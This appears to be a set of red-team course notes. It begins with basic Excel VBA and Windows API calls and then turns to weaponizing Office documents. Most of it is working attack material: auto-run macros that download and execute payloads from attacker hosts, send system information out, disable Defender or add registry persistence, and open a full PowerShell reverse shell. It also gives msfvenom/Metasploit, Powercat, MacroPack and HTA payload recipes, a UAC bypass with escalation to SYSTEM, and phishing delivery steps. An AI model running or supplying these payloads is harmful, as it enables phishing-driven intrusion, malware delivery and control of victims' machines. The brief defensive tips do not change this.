   - Enable **Safe Attachments** and **Safe Links** features to inspect documents in real-time.

---

### VBA Macro Development.

## 1. **How to Create a Macro in Excel**

1. **Enable Developer Tab** (if not already visible):
   - Go to `File` → `Options` → `Customize Ribbon` → Check **Developer** under Main Tabs.
2. **Create a Macro**:
   - Go to New File
   - Go to the **Developer Tab** → Click **Macros**.
   - Specify What Macro you want to view → Linking to the Macro you Working on. (Choose Document)
   - Provide a **name** (no spaces) and assign a **shortcut key** if needed.
   - Perform the actions you want to automate in the editor
   - Stop recording via **Developer Tab** → **Stop Recording**.
3. **Open the VBA Editor**:
   - Press **ALT + F11** to open the VBA editor.
   - The recorded macro will appear under **Modules**.

---

## 2. **Basic VBA Syntax**

Here’s a simple VBA macro example that displays a message box:

```vbnet
Sub HelloWorld()
    MsgBox "Hello, World!"
End Sub
```

- **Sub**: Defines the start of a macro (procedure).
- **End Sub**: Marks the end of the procedure.
- **MsgBox**: Displays a message box with the specified text.

---

## 3. **Variables and Data Types**

In VBA, you can declare variables to store data. Common data types include:

```vbnet
Dim name As String
Dim age As Integer
Dim pi As Double

name = "Alice"
age = 25
pi = 3.14159
```

- **Dim**: Declares a variable.
- **String**: Stores text.
- **Integer**: Stores whole numbers.
- **Double**: Stores decimal numbers.

---

## 4. **Control Structures (If-Else, Loops)**

### If-Else Statement:

```vbnet
Sub CheckNumber()
    Dim num As Integer
    num = 10

    If num > 0 Then
        MsgBox "Positive"
    ElseIf num < 0 Then
        MsgBox "Negative"
    Else
        MsgBox "Zero"
    End If
End Sub
```

### For Loop:

```vbnet
Sub LoopExample()
    Dim i As Integer
    For i = 1 To 5
        MsgBox "Count: " & i
    Next i
End Sub
```

### While Loop:

```vbnet
Sub WhileExample()
    Dim i As Integer
    i = 1
    While i <= 5
        MsgBox "Count: " & i
        i = i + 1
    Wend
End Sub
```

---

## 5. **Working with Excel Objects**

Excel has various objects like **Workbook**, **Worksheet**, **Range**, and **Cell**. Here's how you can manipulate them:

```vbnet
Sub WriteToCell()
    Sheets("Sheet1").Range("A1").Value = "Hello"
End Sub
```

- **Sheets("Sheet1")**: Refers to the worksheet named "Sheet1."
- **Range("A1")**: Refers to cell A1.
- **Value**: Sets the value of the cell.

---

## 6. **Error Handling in VBA**

To gracefully handle errors, use the `On Error` statement.

```vbnet
Sub SafeDivision()
    On Error GoTo ErrorHandler
    Dim result As Double
    result = 10 / 0  ' This will cause a divide-by-zero error.
    Exit Sub

ErrorHandler:
    MsgBox "An error occurred: " & Err.Description
End Sub
```

---

## 7. **User-Defined Functions (UDFs)**

You can create custom functions that work just like built-in Excel functions.

```vbnet
Function SquareNumber(num As Integer) As Integer
    SquareNumber = num * num
End Function
```

- Use it in Excel: Type `=SquareNumber(5)` in a cell to get 25.

---

## **Calling Windows APIs from VBA**

### **What is the Windows API?**

The **Windows API (WinAPI)** is a collection of functions that allow programs to perform tasks like manipulating windows, accessing system resources, and interacting with hardware. You can call these functions in VBA to extend its capabilities.

---

### **How to Use Windows API in VBA?**

### 1. **Declaring API Functions in VBA**

Windows API functions must be **declared** at the top of a module. This tells VBA what function you are importing from the system library.

Here’s the syntax for declaring an API function:

```vbnet
Copy code
Declare PtrSafe Function <FunctionName> Lib "<LibraryName>" _
    Alias "<AliasName>" (ByVal arg1 As DataType, ...) As ReturnType
```

- **Declare**: Keyword to declare the external function.
- **PtrSafe**: Required for 64-bit VBA (Office 2010+).
- **Lib**: Library where the function resides (e.g., `user32.dll` or `kernel32.dll`).
- **Alias**: Some functions may use an alias (e.g., `"MessageBoxA"`).
- **Arguments**: Parameters required by the API function.

---

### 2. **Example: Calling MessageBox API from User32.dll**

```vbnet
Copy code
Declare PtrSafe Function MessageBox Lib "user32.dll" Alias "MessageBoxA" _
    (ByVal hwnd As LongPtr, ByVal lpText As String, ByVal lpCaption As String, _
    ByVal uType As Long) As Long

Sub ShowAPIMessageBox()
    Dim result As Long
    result = MessageBox(0, "Hello from Windows API!", "API Message", 0)
End Sub
```

- **user32.dll**: A Windows library that provides GUI-related functions.
- **MessageBoxA**: ANSI version of the MessageBox function.
- **hwnd**: Handle to the window (set to 0 for no parent).
- **lpText**: The message to display.
- **lpCaption**: Title of the message box.
- **uType**: Button and icon types (0 = OK button).

---

### 3. **Manipulating Windows Objects (User32.dll)**

Here’s an example of how to **minimize all open windows** using the `ShowWindow` API function.

```vbnet
Copy code
Declare PtrSafe Function FindWindow Lib "user32.dll" Alias "FindWindowA" _
    (ByVal lpClassName As String, ByVal lpWindowName As String) As Long

Declare PtrSafe Function ShowWindow Lib "user32.dll" _
    (ByVal hwnd As Long, ByVal nCmdShow As Long) As Long

Sub MinimizeWindow()
    Dim hwnd As Long
    hwnd = FindWindow(vbNullString, "Untitled - Notepad") ' Find Notepad window
    If hwnd <> 0 Then
        ShowWindow hwnd, 6 ' <- Minimize the window
    Else
        MsgBox "Window not found!"
    End If
End Sub
```

- **FindWindow**: Finds the handle of a specific window by its name.
- **ShowWindow**: Changes the state of the window (6 = Minimize).

---

### **Working with File Operations using Kernel32.dll**

You can use `Kernel32.dll` to perform low-level file operations. Here’s an example of how to **retrieve the current directory**.

```vbnet
Copy code
Declare PtrSafe Function GetCurrentDirectory Lib "kernel32.dll" _
    Alias "GetCurrentDirectoryA" (ByVal nBufferLength As Long, _
    ByVal lpBuffer As String) As Long

Sub GetCurrentFolder()
    Dim buffer As String * 260 ' Create a buffer of 260 characters
    GetCurrentDirectory 260, buffer
    MsgBox "Current Directory: " & Trim(buffer)
End Sub
```

- **GetCurrentDirectory**: Retrieves the current working directory.

---

### **Sleep Function – Pausing Execution**

Sometimes you may want to pause a macro’s execution. Use the `Sleep` function from Kernel32.dll.

```vbnet
Copy code
Declare PtrSafe Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)

Sub PauseMacro()
    MsgBox "Pausing for 3 seconds..."
    Sleep 3000 ' Pause for 3000 milliseconds (3 seconds)
    MsgBox "Resumed!"
End Sub
```

---

## **Tips for Using Windows APIs Safely in VBA**

1. **Test in a Sandbox**: Incorrect API usage can crash your system. Always test in a controlled environment.
2. **Error Handling**: Use error handling (`On Error GoTo`) to catch unexpected issues.
3. **64-bit Compatibility**: Use the `PtrSafe` keyword for 64-bit versions of Office.
4. **Refer to Documentation**: Check the [Microsoft Windows API documentation](https://learn.microsoft.com/en-us/windows/win32/api/) for function details.

---

### No Need To Do that Manually but its good to know How!

### **1. VBA Macro to Download and Execute a Payload (Reverse Shell)**

This macro downloads a **malicious executable (payload)** from a remote server and executes it on the victim’s machine.

```vbnet
Sub AutoOpen()
    ' This macro will run automatically when the document is opened (if security allows).
    Dim obj As Object
    Set obj = CreateObject("Wscript.Shell")

    ' Download payload from remote server using PowerShell.
    obj.Run "powershell.exe -Command ""Invoke-WebRequest -Uri '<http://attacker.com/payload.exe>' -OutFile 'C:\\Users\\Public\\payload.exe'""", 0, True

    ' Execute the payload silently.
    obj.Run "C:\\Users\\Public\\payload.exe", 0, False
End Sub
```

- **AutoOpen()**: Automatically runs the macro when the document is opened.
- **Wscript.Shell**: Allows execution of commands (e.g., running PowerShell).
- **Invoke-WebRequest**: Downloads a payload from a remote server.

> Note: Defenders can mitigate this attack with macro security settings and endpoint protection tools.

---

### **2. Enumerating System Information Using VBA**

This macro collects **system information** (like username and IP address) and sends it back to an attacker-controlled server for reconnaissance.

```vbnet
Sub SystemInfo()
    Dim username As String
    Dim ipAddress As String
    Dim url As String
    Dim obj As Object

    ' Get the username.
    username = Environ("USERNAME")

    ' Get IP address using PowerShell.
    Set obj = CreateObject("Wscript.Shell")
    ipAddress = obj.Exec("powershell.exe -Command ""(Get-NetIPAddress | Select-Object -First 1).IPAddress""").StdOut.ReadAll

    ' Send the information to the attacker's server.
    url = "<http://attacker.com/log.php?user=>" & username & "&ip=" & ipAddress
    obj.Run "powershell.exe -Command ""Invoke-WebRequest -Uri '" & url & "'""", 0, False
End Sub
```

- **Environ("USERNAME")**: Fetches the current user’s name.
- **Get-NetIPAddress**: Retrieves the system's IP address.
- **Invoke-WebRequest**: Sends the collected data to the attacker’s server.

---

### **3. Disabling Security Tools Using VBA Macros**

This macro attempts to **disable Microsoft Defender** using PowerShell commands.

```vbnet
Sub DisableDefender()
    Dim obj As Object
    Set obj = CreateObject("Wscript.Shell")

    ' Disable Windows Defender real-time protection.
    obj.Run "powershell.exe -Command ""Set-MpPreference -DisableRealtimeMonitoring $true""", 0, True
End Sub
```

- **Set-MpPreference**: A PowerShell cmdlet to modify Defender settings.
- This attack assumes the attacker has sufficient permissions to disable Defender.

> Mitigation: Always enforce Group Policies that block changes to Defender settings and restrict PowerShell usage.

---

### **4. Persistence Using VBA Macros (Registry Modification)**

The following macro adds itself to the **Windows startup** registry key to maintain persistence.

```vbnet
Sub PersistInRegistry()
    Dim obj As Object
    Set obj = CreateObject("Wscript.Shell")

    ' Add the macro to the Windows startup registry.
    obj.Run "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v OfficeMacro /d 'C:\\Users\\Public\\malicious.docm'", 0, True
End Sub
```

- **HKCU\Software\Microsoft\Windows\CurrentVersion\Run**: Registry key for user startup programs.
- The malicious document (`malicious.docm`) will execute every time the user logs in.

> Note: This attack requires write access to the registry.

---

### **5. VBA Macro to Execute a Reverse Shell**

This macro opens a reverse shell using **PowerShell** to connect back to the attacker’s machine.

```vbnet
Sub ReverseShell()
    Dim obj As Object
    Set obj = CreateObject("Wscript.Shell")

    ' Reverse shell command.
    obj.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command ""$client = New-Object System.Net.Sockets.TCPClient('attacker.com', 4444);$stream = $client.GetStream();[byte[]]$buffer = 0..65535|%{0};while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()""", 0, False
End Sub
```

- **New-Object System.Net.Sockets.TCPClient**: Creates a reverse TCP connection to the attacker's server.
- **Stream.Read**: Reads input from the attacker.
- **iex**: Executes commands received from the attacker.

> Mitigation: Monitor network traffic for suspicious connections and restrict PowerShell execution.

---

## **Pentester Workflow Using VBA Macros**

1. **Prepare the Macro Payload**:
   - Develop and test the VBA macro in a controlled environment.
2. **Deliver the Payload**:
   - Embed the macro in a Word or Excel document (.docm or .xlsm).
   - Use **phishing emails** to deliver the document to the target.
3. **Execution and Callback**:
   - Once the target opens the document and enables macros, the payload executes.
   - Ensure your **Command & Control (C2) server** is ready to receive connections.
4. **Post-Exploitation**:
   - Use the reverse shell to explore the victim’s system.
   - Escalate privileges if needed and deploy additional tools (e.g., keyloggers, persistence mechanisms).

---

## **Defensive Measures to Mitigate VBA Macro Attacks**

1. **Disable Macros by Default**: Set Office applications to block macros from untrusted sources.
2. **Use Email Filters**: Block emails with attachments that contain macros.
3. **Monitor PowerShell Execution**: Restrict PowerShell and WMI scripts.
4. **Network Segmentation**: Limit internet access for critical systems to prevent callbacks.
5. **Endpoint Protection**: Use behavior-based detection tools to identify malicious macro activity.

---

### ⇒ References in case you want to dig deeper:

1. https://www.automateexcel.com/
2. https://www.codecademy.com/learn/ext-courses/vba-getting-started-with-vba-in-excel
3. https://www.youtube.com/watch?v=zYWyPZDndVg
4. https://github.com/Tylous/Ivy {Tool}
5. https://github.com/infosecn1nja/MaliciousMacroMSBuild {Tool}

---

### VBA Macro Weaponization with MSFvenom and UAC Bypass.

```bash
# First Technique -> VBA-exe ...
# Show up all msfvenom formats :
	~$ msfvenom --list formats # You Will gives you all executable formats | we care in vba-exe and vba-psh (BC vba can cause some problems an newer versions)
	# -------------------------------------------
# Generating a VBA-exe :
	~$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.X.X LPORT=3535 -f vba-exe
	# Follow the output instractions, Copy and Paste the VBA code into the DOC you want.
# Take care of sub Workbook_Open == excel sheets AND Document_Open == Word Document
# The Encoded payload Section of the msfvenom output will inserted into the document Page :D !, For now ..
# You may find some error need to solve...
# -------------------------------------------
# Back to our attacker machine :
# Set Your Metasploit multihandler..
	~$ msfconsole -q # to avoid the banner
	msf6> use exploit/multi/handler
	msf6 exploit(multi/handler)> set payload windows/meterpreter/reverse_tcp
	msf6 exploit(multi/handler)> set LHOST 192.168.X.X
	msf6 exploit(multi/handler)> set LPORT=3535
	msf6 exploit(multi/handler)> run
# -------------------------------------------
# Back to Target System:
# Now Open the document and enable the macro ..
# If everything goes right you will get a meterpreter session...
# ==============================================================================
# Secound Technique -> **VBA-psh**
# Generating a **VBA-psh** Macro :
	~$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.X.X LPORT=3535 -e x86/shikata_ga_nai  -f vba**-psh**
	# => Exectlly the same process but without adding anything in the doc file page .. just the macro tab(blank word file)
# ==============================================================================
# Bypasing UAC and elevate our privilage Usign our meterpreter session. => get the system
# --------------------------------------
	meterpreter> shell # To get a shell on the target
	C:\Users\Admin\Desktop> whoami /priv # To list all your Privilages and the state ..
	C:\Users\Admin\Desktop> net localgroup administrators # To list al admin members and if we ware parrt of it
# Back to Your Meterpreter session :
	meterpreter> getpriv # To list all your priv again.
	meterpreter> load incognito
	meterpreter> list_tokens -u # to list all personation tokens | we dont ..
# Background this meterpreter sesstion to searching in metasploit..
	meterpreter> bg
	msf6 exploit(multi/handler)> search bypassuac # This will list all UAC Bypasses exploits
# Using dotnet_profiler
	msf6 exploit(windows/local/bypassuac_dotnet_profiler)> show options
	msf6 exploit(windows/local/bypassuac_dotnet_profiler)> set SESSION 2 # giving it your session
	msf6 exploit(windows/local/bypassuac_dotnet_profiler)> run
	meterpreter> grtpriv # You Should have more now ;)
# -------------------------------------------
# Time for Token Impersonate ...
	meterpreter> load incognito
	meterpreter> list_tokens -u # You should find -> ( NT AUTHORITY\SYSTEM )
	meterpreter> Impersonate_token "NT AUTHORITY\SYSTEM"
	meterpreter> getpriv # Hello Batman :)
	meterpreter> shell # just to be sure ..
	C:\WINDOWS\system32> whoami # Outputed == NT AUTHORITY\SYSTEM
	C:\WINDOWS\system32> whoami /priv # You still batman :)
	#-------------------------------
	# You can load kiwi and hashdumb the creds_ and go on .. but thats a whole other story ( Crack the hash or pass it, etc)
```

---

### **VBA PowerShell dropper.**

A **VBA PowerShell dropper** is a payload delivery technique that combines VBA with PowerShell. This method is commonly used by hackers to bypass traditional antivirus protections and execute malicious scripts or programs.

### In Nutshell

- A **dropper** is a type of malware designed to **download**, **extract**, or **deploy** additional malicious payloads on a target system.

---

### How a VBA PowerShell Dropper Works:

1. **Embedding VBA Code in Office Documents:**
   - The attacker creates an Office file (like a Word document or Excel spreadsheet) with embedded VBA macros.
   - The VBA macro contains obfuscated or encoded **PowerShell commands**.
2. **Triggering Execution:**
   - Once the victim opens the document and **enables macros**, the VBA code is executed.
   - This VBA script can silently **invoke PowerShell** to execute commands or download a payload from a remote server.
3. **Payload Delivery:**
   - The PowerShell command might:
     - Download and install malware (like a RAT, ransomware, or keylogger).
     - Perform reconnaissance, modify registry keys, or establish persistence.

---

### Example VBA Code Snippet (PowerShell Dropper.)

```vbnet
Sub AutoOpen()
		dropper
End Sub
Sub Document_Open()
		dropper
End Sub

Sub dropper()
    ' This VBA macro will execute automatically when the document opens
    Dim url As String
    Dim psScript As String
    url = "http://our-malicious-site.com/payload.exe"

    'This is the script that  download and execute the file
    psScript = "Invoke-WebRequest -Uri """ & url & """ -OutFile ""C:\Users\Admin\file.exe"";" & vbCrlf & _ "Start-Process -FilePath ""C:\Users\Admin\file.exe"""

    'execuring the powershell scripts using shell and hides the window for stealth
    Shell "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command """ & psScript & """", vbHide
End Sub
```

---

### VBA Macro reverse shell with Powercat

PowerCat is a PowerShell script that functions as a network tool similar to Netcat, designed specifically for the Windows environment. Like Netcat, PowerCat enables network communication and can be used for tasks such as port scanning, file transfers, reverse shells, and remote administration.

Some core features of PowerCat:

1. **Reverse and Bind Shells**: PowerCat can establish reverse or bind shells over TCP/UDP, allowing remote command execution on compromised machines.
2. **File Transfer**: It can transfer files over a network, making it practical for moving scripts or files during an engagement.
3. **Port Scanning**: PowerCat can scan for open ports, providing basic reconnaissance capabilities.
4. **Full PowerShell Integration**: Since it’s a PowerShell script, it integrates seamlessly with other PowerShell tools and cmdlets, often avoiding detection on systems where PowerShell logging is minimal.

### Lab Demo → Taking a shell using macro powershell code

```powershell
# Copy and paste this oneliner into your attacker machine terminal:
-----------------
LHOST=192.168.x.x
LPORT=8888
pwsh -c "iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c $LHOST -p LPORT -e cmd.exe -ge" > /tmp/reverse-shell.txt
-----------------
# Navigate to /tmp/ => cd tmp
# host your reverse shell using python3 http server or whatever you want
# Now for the Macro ( Delivery as U Like! ) that will download and execute at the same time..
# =====================================================
Sub AutoOpen()
	powercat
End Sub
----------
Sub Document_Open()
	Powercat
End Sub
----------
Sub Powercat()
	Dim Str As String
	Str = "powershell -c ""$code=(New-Object System.Net.Webclient).DownloadString('https://yourHostedReverseShell.lol/reverse-shell.txt'); iex 'powershell -WindowStyle Hidden -E $code' """
	CreateObject("Wscript.shell").Run Str
End Sub
# =====================================================
# Back to your Attaker Machine, Set The Listener with => nc -nlvp 8888
# Once the Document and Macro Run ad everything goes right you will get a shell..
```

### Using ActiveX Controls for Macro Execution

Using ActiveX controls for macro execution is a technique often employed in Red Teaming, particularly within Microsoft Office documents like Word or Excel.

### 1. **What Are ActiveX Controls?**

- ActiveX controls are small programs or objects used to add functionality to applications, especially Microsoft Office and Internet Explorer. They are built in various languages, including Visual Basic and C++, and can be embedded in Office documents to execute code. think of it Like JavaScript for office programs
- Common examples include buttons, list boxes, text fields, or other interactive elements that can trigger macros when activated.

### 2. **How Attackers Use ActiveX Controls in Macro Execution**

- **Embedding Malicious Macros**: ActiveX controls can contain embedded Visual Basic for Applications (VBA) scripts, which allow attackers to execute arbitrary code when users interact with them.
- **Triggering Execution**: By embedding an ActiveX control in a document and configuring it to run a VBA script on certain actions (e.g., when clicked or on document open), attackers can control when and how their payload is executed.
- **Social Engineering**: Often, attackers design the document to prompt users to enable content or click a button, triggering the ActiveX control that executes the payload.

### 3. **Example Scenario**

- An attacker might embed a hidden ActiveX button in an Excel sheet with VBA code attached to it. When the victim opens the file, the attacker prompts them to enable content (macros), which enables the execution of the embedded macro that can download and execute a payload.
  ### Do Some Research to Dig Deeper → [Searching…](https://www.google.com/search?q=ActiveX+Control+for+penetration+testing+intext%3Amacro&sca_esv=412385546941e466&ei=G3gjZ6nEH5yskdUPxrHE8Q8&ved=0ahUKEwjpvce7z7iJAxUcVqQEHcYYMf4Q4dUDCA8&uact=5&oq=ActiveX+Control+for+penetration+testing+intext%3Amacro&gs_lp=Egxnd3Mtd2l6LXNlcnAiNEFjdGl2ZVggQ29udHJvbCBmb3IgcGVuZXRyYXRpb24gdGVzdGluZyBpbnRleHQ6bWFjcm9Ip19Q-xxYvVRwAngBkAEAmAGfAaABmw2qAQM2Lji4AQPIAQD4AQGYAgmgAv0IwgIKEAAYsAMY1gQYR8ICBRAhGKABwgIEECEYFcICBxAhGKABGAqYAwCIBgGQBgOSBwMxLjigB_Ur&sclient=gws-wiz-serp)

### Pretexting Phishing Documents.

Making your document as much trustful as possible to making your target engage with it. (We Need To make our Doc look not suspicious at all) .

### Its Very theoretical in here so Check this ⇒ https://github.com/martinsohn/Office-phish-templates

Notice that if you use any temp from the resources above it will not working because its downloaded from internet for security reasons so you should do as follows to avoid that.

1. Choose Whatever temp you want from the repo and Download it
2. Open it with office word or excel and **copy** the embedded Macro and The Style or the page content
3. Open a blank new doc and **Paste** the macro. and the style and save it .
4. Notice that may not working directly based on the Sub Routine and the installed metadata thing! ..
5. Notice that all those things are for studying proposes, In real world its a different thing!

---

### Automating Macro Development With MacroPack → **_Time For Some Realistic Thing!_**

### What is MacroPack?

MacroPack is an advanced tool designed for red teams to automate the development and weaponization of Office macros and other types of payloads for social engineering and Client side attacks. MacroPack facilitates the creation of obfuscated, weaponized macros in various formats, including Word, Excel, and PowerPoint, and supports a range of script types like VBS and HTA, which are common in red team operations. **_it only installed on Windows for obvious reasons_**

### Why Use MacroPack?

- **Obfuscation and Anti-Virus Bypass**: MacroPack has built-in obfuscation capabilities that help bypass traditional antivirus solutions, making it ideal for covert operations. It supports VBA and VBS obfuscation, AMSI (Antimalware Scan Interface) bypass, and even multiple UAC (User Account Control) bypasses.
  [GitHub](https://github.com/sevagas/macro_pack)
- **Flexibility with Payload Types**: The tool supports a variety of payload types and delivery methods, such as injecting shellcode, downloading executable, and performing in-memory execution, which enhances stealth and adaptability across various security setups
  - **It Supports a lot of formats** :
    - **Microsoft Office Documents**:
      - Word (`.doc`, `.docm`)
      - Excel (`.xls`, `.xlsm`)
      - PowerPoint (`.ppt`, `.pptm`)
      - Publisher
    - **Script Files**:
      - VBA (Visual Basic for Applications)
      - VBS (Visual Basic Script)
      - HTA (HTML Application)
      - SCT (Scriptlet files)
    - **Executable and DLL Files**:
      - `.exe` (Standalone executables)
      - `.dll` (Dynamic Link Libraries)
      - `.cpl` (Control Panel items)
    - **Shortcut Files**:
      - `.lnk` (Windows shortcuts)
      - `.url` (URL shortcut files)

---

### LAB Demo : Automating Macro Development using MacroPack

- Requirements:
  1. A Windows sys with MacroPack and Metasploit installed (Resource Development and Weaponization System)
  2. A Second Win System that we connected with RDP (To Test Out Our Work)

```powershell
# =======================================================================
# Creating a Rev Shell with MSFvenom and MacroPack :
# =======================================================================
# In our Resource-Dev Machine we open the Powershell from the installed MacroPack folder path.
PS C:\Users\Administrator\Desktop\macro_pack> dir # listing ..
PS C:\Users\Administrator\Desktop\macro_pack> .\macro_pack.exe --help # To Desplay the tool help menu. Very Recommended to Read it.
PS C:\Users\Administrator\Desktop\macro_pack> .\macro_pack.exe --listformats # To Desplay all formats.
# -------------
# It Works With Piping :
PS C:\Users\Administrator\Desktop\macro_pack> echo "calc.exe" | .\macro_pack.exe -t CMD -o -G "test.doc" # This May take some time
# -------------
# Creating a Custom Meterpreter Reverse Shell Macro using MSFVenom & MacroPack:
PS C:\Users\Administrator\Desktop\macro_pack> .\macro_pack.exe --listtemplates # To list all templates that we can use, ***Very Recommended to Read it.***
PS C:\Users\Administrator\Desktop\macro_pack> msfvenom.bat -p windows/meterpreter/reverse_tcp LHOST=<yourIP> LPORT=4643 -f vba | .\macro_pack.exe -o -G "Resume.doc"
# -------------
# After Finishing Creation, Set up your Listener .. OFC You can use whatever you want to handle this!
PS C:\Users\Administrator\Desktop\macro_pack> msfconsole.bat
msf6> use exploit/multi/handler
msf6 exploit(multi/handler)> set payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler)> set LHOST=<yourIP>
msf6 exploit(multi/handler)> set LPORT=4643
msf6 exploit(multi/handler)> run
# -------------
# Choose Whatever the payload Delevery Option you want ...
# If every thing goes Right you will get a Rev-shell ..
# -------------------------------------------------------------------------

# =======================================================================
# Creating a Dropper with MSFvenom and MacroPack :
# =======================================================================
PS C:\Users\Administrator\Desktop\macro_pack> msfvenom.bat -p windows/meterpreter/reverse_tcp LHOST=<yourIP> LPORT=4643 -f exe > update.exe
PS C:\Users\Administrator\Desktop\macro_pack> echo "https://TheAtteckerHost/update.exe" "update.exe" | .\macro_pack.exe -t DROPPER -o -G "Account2024.xls"
# Set up your Listener.. Just like we did ...
# Choose Whatever the payload Delevery Option you want ...
# If everything goes right you should get a shell ...
```

---

### HTML Applications and HTA Attacks.

HTML Applications (HTAs) are a valuable tool for penetration testers and red teamers due to their ability to execute arbitrary code on a target machine, often bypassing traditional security controls. HTAs are essentially HTML documents that allow embedding and executing scripts in VBScript or JavaScript, making them capable of interacting with the Windows operating system directly.

### 1. So **What is an HTA?**

- HTA stands for **HTML Application**, which is a file with the `.hta` extension.
- These files are executed by the Windows `mshta.exe` executable, which is built into Windows systems, providing direct access to the system and local resources.
- HTAs run with a current user level of trust than a typical web-based HTML page, meaning they are less restricted by the sandbox that limits scripts from accessing system resources.

### 2. **Why are HTAs Useful in Red Teaming?**

- **Evasion**: HTAs can bypass some security defenses that detect and block more common executables (like `.exe` files). Since HTAs are less frequently used, they are less likely to be flagged by traditional antivirus software.
- **Native Code Execution**: They can execute VBScript and JavaScript directly on a machine, allowing for **native code execution**.
- **Built-In Windows Support**: `mshta.exe` is a trusted Windows binary that is allowed by default on most systems, making it an effective tool for attackers leveraging **Living Off the Land** techniques (using legitimate, pre-installed software for malicious purposes).

### 3. **HTAs for Phishing and Payload Delivery**

- **Initial Access**: HTAs can be delivered via phishing emails, where the HTA file is attached or linked. Once the user executes the HTA, the embedded script can download additional payloads, such as PowerShell scripts, or even establish a reverse shell.
- **Payload Delivery**: HTAs can act as an initial loader, executing scripts that fetch further malicious components. For example, an HTA can be used to download and execute a more complex payload, often without alerting the user.

### 4. **HTA for Red Team Operations**

- **Bypassing Application Whitelisting**: Since `mshta.exe` is commonly whitelisted, HTAs provide a way to bypass application whitelisting solutions.
- **Code Obfuscation**: HTAs allow obfuscating JavaScript or VBScript to evade static analysis or detection by endpoint protection solutions.
- **Pivoting and Lateral Movement**: HTAs can also be used during post-exploitation phases to assist in lateral movement across the network by interacting with network resources or launching other system commands.

### 5. **Execution Example**

A simple HTA attack could look like this:

```html
<html>
  <head>
    <title>HTA Attack</title>
    <script language="VBScript">
      Set shell = CreateObject("WScript.Shell")
      shell.Run "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('<http://malicious-server/payload.ps1>')"
    </script>
  </head>
  <body>
    <h1>Important Document</h1>
    <p>Loading, please wait...</p>
  </body>
</html>
```

In this case:

- The HTA would execute PowerShell, which downloads and executes a payload from a remote server.
- This vector is typically called Drive-by Compromised technique
- This Vector works in Internet explorer but we can leverage this to others browsers

### Lab Demo : HTML Applications

1. Go to `/var/www/html` in your attacker server/machine.
2. Vim PoC.hta
3. after finishing create your page, start the Apache2 server (for example) and host the page on it by typing `sudo systemctl start apache2`
4. go to your target machine and hit your attacker IP machine in the Internet explorer **`and`** the page name
5. It may gives you an warning. remember its just Demo :)

```html
<html>
  <head>
    <title>HTA Attack</title>
    <script>
      var payload = "calc.exe";
      new ActiveXObject("WScript.Shell").Run(payload);
    </script>
  </head>
  <body>
    <h1>Important Document</h1>
    <script>
      self.close();
    </script>
  </body>
</html>
```

---

### Lab Demo : HTA Attack to get a reverse shell.

1. Go to `/var/www/html` in your attacker server/machine.
2. Using MSFvenom :

```bash
~$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.X.X LPORT=3535 -f hta-psh -o Rev-shell.hta
```

1. Set up your netcat listener using `nc -lnvp 3535`
2. go to your target machine and hit your attacker IP machine in the Internet explorer **`and`** the page name.
3. Run it and allow and you are in …
4. Note : You can embed a macro to execute this HTA into a Document, like so ⇒

```vbnet
Sub AutoOpen()
	ExecutionHTA
End Sub
----------------------
Sub Document_Open()
	ExecutionHTA
End Sub

Sub ExecutionHTA()
	Dim url As String
	Dim command As String
	url = "http://192.168.X.X/Rev-shell.hta"
	command = "mshta.exe" & url
	shell command, vbNormalFocus
End Sub
```

---

### File Smuggling With HTML & JS → OUR Delivery Section in this Course…!

⇒ This Phase when the attacker delivers the payload or malicious DOC to the target.

HTML Smuggling is a technique that leverages HTML and JavaScript to bypass network defenses, particularly by evading traditional security measures like firewalls and email filtering systems. This technique is especially effective because it uses legitimate HTML and JavaScript functions to deliver malicious payloads, allowing attackers to smuggle harmful content into a target’s system without triggering typical security alerts.

In This Technique the website Acting Like a Dropper!

### How HTML Smuggling Works?

1. **Initial Delivery**: Attackers typically send a link or attachment that contains HTML and JavaScript code embedded within a webpage or an email attachment.
2. **Encoding and Smuggling**: Once opened, the HTML file uses JavaScript to create or decode malicious content, often an executable, directly on the victim’s machine. This encoding often masks the payload from traditional scanning methods.
3. **Payload Deployment**: The JavaScript creates the malicious file on the user’s computer, bypassing defenses that would usually block or scan downloads directly from external sources. The payload then activates, executing further commands or establishing a foothold on the device.

### Why It’s Effective

HTML Smuggling is challenging to detect because the attack largely happens within the browser and client-side environment, exploiting trusted protocols. Since network defenses focus on inbound threats, they often fail to spot threats created on the client side through legitimate HTML and JavaScript functionality.

### Real-World Use Cases

HTML Smuggling has become a popular method for ransomware groups and other advanced persistent threat (APT) actors. In recent years, campaigns by groups like Nobelium (notable for the SolarWinds breach) have used HTML Smuggling in attacks on high-profile organizations.

### References:

1. https://www.microsoft.com/en-us/security/blog/2021/11/11/html-smuggling-surges-highly-evasive-loader-technique-increasingly-used-in-banking-malware-targeted-attacks/
2. https://attack.mitre.org/techniques/T1027/006/

---

### Initial access Via SpearPhishing Attachment - LAB Demo

Scenario : We Have an target employee email and we will use it to send an email contain an attachment (.exe)

```bash
# There is 2 Targets that we want to gain access to …
# demo.target.local --> exposed server Hosting the mail server that our target using..
# demo1.target.local --> non-reachable target (employees computers)
# The Target email will be pop.demo@local
# =========================================================================
# 1) Nmap Scan on demo.target.local
~$ nmap -Pn -sS -sV -F demo.target.local # This Should be Fast Scan | Its a WIN Server and Runing hMAilServer smtp
# =========================================================================
# 2) Gnerating the payload before anything else :
~$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=(UR-IP) LPORT=9988 -f exe > backdoor.exe
# =========================================================================
# 3) Creating ***email_sinding.py*** script that will utilize the smtp lib to sending for us => You can find a snappit in the next code section
# After Creation give the script execution
~$ chmod +x ***email_sinding.py***
